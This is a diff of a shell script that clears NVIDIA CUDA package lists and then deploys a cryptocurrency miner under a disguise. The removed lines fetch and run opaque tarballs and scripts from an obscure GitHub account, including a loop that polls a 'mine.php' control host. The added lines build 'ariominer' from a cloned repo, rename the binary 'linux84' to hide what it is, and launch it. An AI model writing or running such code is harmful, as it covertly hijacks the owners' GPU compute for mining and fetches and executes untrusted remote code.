@@ -26,61 +26,11 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-cd /mnt/disks/user/project/
-
-if [[ 4 == 4 ]]; then
-
-if [[ 4 == 4 ]]; then
-
-cd /mnt/disks/user/project/
-
-wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux4.tar.gz
-tar -xf ./linux4.tar.gz
-
-cd linux4
-
+git clone https://github.com/mobileapps84741274/linux8474
+cd linux8474
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release
+make
+mv ./ariominer ./linux84
 ./linux84 8
-
-else
-
-cd /mnt/disks/user/project/
-
-wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474744
-
-bash ./linux8474744
-
-fi
-
-else
-
-while true
-do
-
-cd /mnt/disks/user/project/
-
-string=$(curl -s http://linux84.distro.cloudns.cl:84/mine.php?q=info)
-if [[ $string == *"16384"* ]]; then
-
-wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84.tar.gz
-tar -xf ./linux84.tar.gz
-
-cd linux84
-
-./linux84 -t 2
-
-else
-
-cd /mnt/disks/user/project/
-
-wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxapps84.tar.gz
-tar -xf ./linuxapps84.tar.gz
-
-cd linuxapps84
-
-./linux84 -t 2
-
-fi
-
-done
-
-fi
